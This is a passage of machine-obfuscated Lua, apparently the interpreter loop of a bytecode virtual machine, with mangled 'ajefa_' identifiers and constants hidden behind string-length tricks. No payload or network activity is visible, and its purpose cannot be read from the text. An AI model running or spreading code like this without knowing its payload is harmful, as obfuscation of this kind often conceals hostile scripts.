lIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("6a")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Pyt")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("W0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1Cs")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PUaP")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ck")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mgD")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9S")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("nTY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ep")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("9xE")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gYF1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Um")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{452;924;775;330};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("kUeL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eG")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("7Vb")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("87iS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{769;321;209;952};"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2fi")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("sZ86")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("En")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("B61")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("G1is")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Mh")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("EzE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1R")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("MYa")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("YX")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("e7x")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("gUqS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{405;234;573;388};{283;471;563;760};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("zOg")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("1c")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("6Il")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cU")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{{584;319;527;938};"1 + 1 = 111";"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("0R")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("AL9")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("KG")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("8kB")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fTUq")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("re")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("2Q9")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("pp")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2gE")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("vaD3")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("br")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("NV3")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("MB")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("zks")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8Pv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("1ABK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UZj")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("3yda")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("N4")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dx7")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0VeW")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2n")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{239;143;544;491};{357;518;618;23};{2;908;129;542};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("pPmC")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("yP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ge8")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ADvQ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("hO")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("PGL")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("qb")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("e4y")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("PK")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("DuS")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("on2o")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("SJ")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("sWi")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("nY")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("YII")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fp")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{179;821;182;407};"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("Ly")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("jDD")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xr")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("e9E")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("svfo")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("y7")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("lKJ")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Oz")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("dGX")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{421;418;63;454};"1 + 1 = 111";"1 + 1 = 111";"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("k1")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("B6P")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("z3")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("PSS")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("fv")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{922;5;747;668};"1 + 1 = 111";{128;213;966;931};}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("SRqL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ba")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("H5m")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";{802;185;773;879};"1 + 1 = 111";}]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("A0")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("8fQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("QYab")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3z")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("CPi")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("ydVi")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("cW")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("1yd")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("2W")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("mQp")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("ZU")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("VRM")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("PGYY")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("g2")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("mY0")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{507;46;517;109};{265;176;22;72};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("Uz8")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("UH")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("4FX")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_IIIlIllIllllIIllIlllIIll=ajefa_lllIIlIllIlIllllIIlIIlll[#("8Z")]ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll]=ajefa_lIlllIll[ajefa_IIIlIllIllllIIllIlllIIll](ajefa_IlIIIlIIIIlIIlllI(ajefa_lIlllIll,ajefa_IIIlIllIllllIIllIlllIIll+1,ajefa_lllIIlIllIlIllllIIlIIlll[#("xVE")]))ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("Xa")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("0lz")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("EQZV")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lk")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("Ym1")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("d7")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("P90")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Yg36")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("SE")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";{580;195;36;689};"1 + 1 = 111";}];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("FL")]]=ajefa_IlIIllIIIl[ajefa_lllIIlIllIlIllllIIlIIlll[#("tOK")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("3r")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("po1")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("TmUL")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{"1 + 1 = 111";"1 + 1 = 111";}]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#{{252;367;42;204};"1 + 1 = 111";"1 + 1 = 111";}]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Kqob")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("r8")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("LXv")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("Eud7")]];else ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("uA")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("mrD")]][ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("cPAI")]]];end;elseif ajefa_IIIlIllIllllIIllIlllIIll<=#("vUVYHMFOVGAubaO31g7v91aVl10oXhjpCyd3")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("xP")]]=ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("sZU")]]*ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("m2CW")]];elseif ajefa_IIIlIllIllllIIllIlllIIll>#("QsQXuY96abjsmIgsCGFTaMPVp0Nvk3O6VskXq")then ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("b5")]][ajefa_lllIIlIllIlIllllIIlIIlll[#{{117;492;7;563};"1 + 1 = 111";{83;73;602;770};}]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("OZlf")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("lo")]]=ajefa_IllIllll[ajefa_lllIIlIllIlIllllIIlIIlll[#("J5K")]];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_lIIllIlIIlllII[ajefa_IlIIIlIllIlIlllIlIlIllll];ajefa_lIlllIll[ajefa_lllIIlIllIlIllllIIlIIlll[#("eQ")]][ajefa_lllIIlIllIlIllllIIlIIlll[#("r86")]]=ajefa_lllIIlIllIlIllllIIlIIlll[#("K4e3")];ajefa_IlIIIlIllIlIlllIlIlIllll=ajefa_IlIIIlIllIlIlllIlIlIllll+1;ajefa_lllIIlIllIlIllllIIlIIlll=ajefa_l